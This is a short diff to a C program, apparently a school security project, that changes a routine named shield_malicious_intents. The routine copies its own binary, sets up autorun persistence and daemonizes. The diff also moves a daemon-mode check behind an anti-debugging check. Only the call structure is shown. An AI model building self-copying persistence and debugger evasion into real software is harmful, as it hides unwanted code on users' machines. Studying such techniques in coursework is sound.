@@ -6,7 +6,7 @@
 /*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/03/23 01:58:58 by kiroussa          #+#    #+#             */
-/*   Updated: 2025/11/17 23:46:21 by kiroussa         ###   ########.fr       */
+/*   Updated: 2025/11/19 04:17:41 by kiroussa         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -99,10 +99,11 @@ static inline void	shield_malicious_intents(void)
 		return ;
 #else // if !MATT_MODE
 	DEBUG("shield_copy\n");
-	if (!shield_copy())
+	char *binary_path = NULL;
+	if (!shield_copy(&binary_path))
 		return ;
 	DEBUG("shield_autorun_setup\n");
-	if (!shield_autorun_setup())
+	if (!shield_autorun_setup(binary_path))
 		return ;
 #endif // !MATT_MODE
 	DEBUG("shield_daemonize\n");
@@ -127,11 +128,11 @@ int	main(void)
 			return (1);
 		}
 	}
-	if (shield_is_flipped())
-		return (shield_daemon_main(), 0);
 	if (shield_antidebug())
 	{
 		DEBUG("passed anti-debug check\n");
+		if (shield_is_flipped())
+			return (shield_daemon_main(), 0);
 		shield_malicious_intents();
 		DEBUG("done\n");
 	}
